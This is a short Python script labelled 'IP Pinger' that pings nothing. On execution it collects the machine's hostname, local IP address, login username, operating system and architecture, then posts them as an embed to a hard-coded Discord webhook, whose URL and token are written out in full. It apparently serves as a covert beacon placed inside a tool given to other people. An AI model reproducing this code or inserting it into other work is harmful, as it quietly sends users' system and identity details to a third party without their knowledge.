import os
import platform
import requests
import socket

# Webhook do Discord onde os logs serão enviados
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1346901790993547284/46suWs6ALGJvPZcnnIxbuyfSvfDnWeUvuYy8EWCOCzkInM5aYesixJELEwz2JYxXIKQ6"

# Nome da ferramenta
TOOL_NAME = "IP Pinger"

def get_system_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        username = os.getlogin()
        os_name = platform.system()
        os_version = platform.release()
        arch = platform.architecture()[0]

        return {
            "hostname": hostname,
            "ip_address": ip_address,
            "username": username,
            "os_name": os_name,
            "os_version": os_version,
            "arch": arch,
        }
    except Exception as e:
        return {"error": str(e)}

def send_log():
    data = get_system_info()
    
    embed = {
        "title": "📢 Novo Log de Execução",
        "color": 16711680,  # Cor vermelha
        "fields": [
            {"name": "🛠️ Ferramenta", "value": f"`{TOOL_NAME}`", "inline": False},
            {"name": "🖥️ Hostname", "value": f"`{data.get('hostname', 'Desconhecido')}`", "inline": True},
            {"name": "🌍 IP", "value": f"`{data.get('ip_address', 'Desconhecido')}`", "inline": True},
            {"name": "👤 Usuário", "value": f"`{data.get('username', 'Desconhecido')}`", "inline": True},
            {"name": "💻 Sistema Operacional", "value": f"`{data.get('os_name', 'Desconhecido')} {data.get('os_version', '')}`", "inline": True},
            {"name": "🔧 Arquitetura", "value": f"`{data.get('arch', 'Desconhecido')}`", "inline": True}
        ]
    }

    payload = {"embeds": [embed]}

    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Erro ao enviar log: {e}")

# Chama a função quando o script for executado
send_log()
